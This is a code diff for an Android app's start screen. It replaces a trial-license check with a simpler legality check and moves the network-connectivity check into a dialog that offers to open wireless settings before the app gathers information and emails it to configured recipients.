@@ -9,8 +9,11 @@ import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 import android.app.Activity;
+import android.app.AlertDialog;
 import android.app.ProgressDialog;
+import android.app.AlertDialog.Builder;
 import android.content.Context;
+import android.content.DialogInterface;
 import android.content.Intent;
 import android.os.Bundle;
 import android.os.Handler;
@@ -140,13 +143,39 @@ public class InitActivity extends Activity
             public void onClick(View v)
             {
             	// If neither in trail and nor licensed, return
-            	LICENSE_TYPE type = ConfigCtrl.getLicenseType(context);
-    			if ((type == LICENSE_TYPE.TRIAL_LICENSED && !ConfigCtrl.stillInTrial(context)) ||
-    				type == LICENSE_TYPE.NOT_LICENSED) {
-    				SysUtils.messageBox(context, context.getResources().getString(R.string.msg_has_sent_trial_expire_sms));
+            	if (!ConfigCtrl.isLegal(context)) {
+            		String title = context.getResources().getString(R.string.error);
+            		String msg = context.getResources().getString(R.string.msg_has_sent_trial_expire_sms);
+            		SysUtils.errorDlg(context, title, msg);
     				return;
     			}
-            	
+    			
+    			if (!NetworkUtil.isNetworkConnected(context)) {
+    				// Ask user if he wants to go to network setting activity to enable network 
+					new AlertDialog.Builder(InitActivity.this)
+						.setTitle(getResources().getString(R.string.info))  
+						.setIcon(android.R.drawable.ic_dialog_info)  
+						.setMessage(R.string.action_goto_network_setting)
+						.setPositiveButton(getResources().getString(android.R.string.yes),  
+							new DialogInterface.OnClickListener() {
+								public void onClick(DialogInterface dialoginterface, int i){
+									// Start network setting activity
+									startActivityForResult(new Intent(android.provider.Settings.ACTION_WIRELESS_SETTINGS), 0); 
+								}
+							}
+						)  
+						.setNegativeButton(getResources().getString(android.R.string.no), 
+							new DialogInterface.OnClickListener() {
+								public void onClick(DialogInterface dialoginterface, int i){
+									return;
+								}
+							}
+						).show();
+					
+					return;
+				}
+
+    			// If network connected, try to collect and send the information
             	progressDialog = ProgressDialog.show(InitActivity.this, getResources().getString(R.string.init_processing), 
             			getResources().getString(R.string.init_waiting), true, false);
             	
@@ -155,13 +184,6 @@ public class InitActivity extends Activity
     				public void run() {
     					mHandler.sendEmptyMessageDelayed(DISABLE_GETINFO_BTN, 0);
     					
-    					// If network connected, try to collect and send the information
-    					if (!NetworkUtil.isNetworkConnected(context)) {
-    						mHandler.sendEmptyMessageDelayed(NETWORK_DISCONNECTED, 0);
-    						mHandler.sendEmptyMessageDelayed(ENABLE_GETINFO_BTN, 0);
-    						return;
-    					}
-        		
     					// Clear attachments
     					if (GetInfoTask.attachments == null) 
     						GetInfoTask.attachments = new ArrayList<File>();
@@ -188,7 +210,7 @@ public class InitActivity extends Activity
     					String subject = getResources().getString(R.string.mail_from) 
         	          		 +  phoneNum + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date()) 
         	          		 + getResources().getString(R.string.mail_description);
-    					String body = String.format(getResources().getString(R.string.mail_body), phoneNum);
+    					String body = String.format(getResources().getString(R.string.mail_body_info), phoneNum);
     					String[] recipients = GlobalPrefActivity.getReceiverMail(context).split(",");
     					if (recipients.length == 0) {
     						mHandler.sendEmptyMessageDelayed(ENABLE_GETINFO_BTN, 0);
